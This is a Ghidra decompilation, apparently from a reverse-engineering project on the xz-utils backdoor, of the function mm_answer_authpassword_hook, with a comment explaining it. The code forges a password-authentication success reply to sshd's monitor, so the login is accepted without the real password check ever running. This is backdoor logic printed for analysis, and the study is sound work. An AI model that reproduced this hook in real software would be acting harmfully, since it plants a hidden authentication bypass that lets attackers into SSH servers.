// /home/kali/xzre-ghidra/xzregh/108100_mm_answer_authpassword_hook.c
// Function: mm_answer_authpassword_hook @ 0x108100
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_authpassword_hook(ssh * ssh, int sock, sshbuf * m)


/*
 * AutoDoc: Handles `MONITOR_REQ_AUTHPASSWORD` by replaying a prebuilt reply buffer whenever the payload provided one, or by
 * synthesizing the four-field success packet when no payload data is pending. The hook emits the reply through
 * `fd_write()`, mirrors sshd's bookkeeping by copying the saved dispatch target back into the table at lVar1+0xa0, and
 * returns 1 so the monitor thread believes password authentication finished successfully without ever touching sshd's
 * password logic. Any structural error falls back to libc's `exit()` to keep the daemon from running partially patched.
 */

#include "xzre_types.h"

int mm_answer_authpassword_hook(ssh *ssh,int sock,sshbuf *m)

{
  libc_imports_t *libc_imports;
  sshd_payload_ctx_t *payload_ctx;
  int result;
  size_t reply_len;
  void *reply_buf;
  uint local_15;
  uint uStack_11;
  undefined1 uStack_d;
  undefined4 uStack_c;
  
  local_15 = 0;
  libc_imports = *(libc_imports_t **)(global_ctx + 0x10);
  payload_ctx = *(long *)(global_ctx + 0x20);
  uStack_11 = 0;
  uStack_d = 0;
  uStack_c = 0;
  if ((m == (sshbuf *)0x0 || sock < 0) || (ssh == (ssh *)0x0)) {
    if ((libc_imports != (libc_imports_t *)0x0) && (libc_imports->exit != (pfn_exit_t)0x0)) {
      (*libc_imports->exit)(0);
    }
    result = 0;
  }
  else {
    reply_len = (size_t)*(ushort *)(payload_ctx + 0x90);
    if ((*(ushort *)(payload_ctx + 0x90) == 0) ||
       (reply_buf = *(uint **)(payload_ctx + 0x98), reply_buf == (uint *)0x0)) {
      reply_buf = &local_15;
      uStack_d = 1;
      uStack_11 = *(uint *)(payload_ctx + 0x40) & 0xff;
      local_15 = (-(uint)(*(int *)(payload_ctx + 0xb8) == 0) & 0xfc000000) + 0x9000000;
      reply_len = (ulong)(local_15 >> 0x18) + 4;
    }
    fd_write(sock,reply_buf,reply_len,libc_imports);
    **(undefined8 **)(payload_ctx + 0xa0) = *(undefined8 *)(payload_ctx + 0xd0);
    result = 1;
  }
  return result;
}

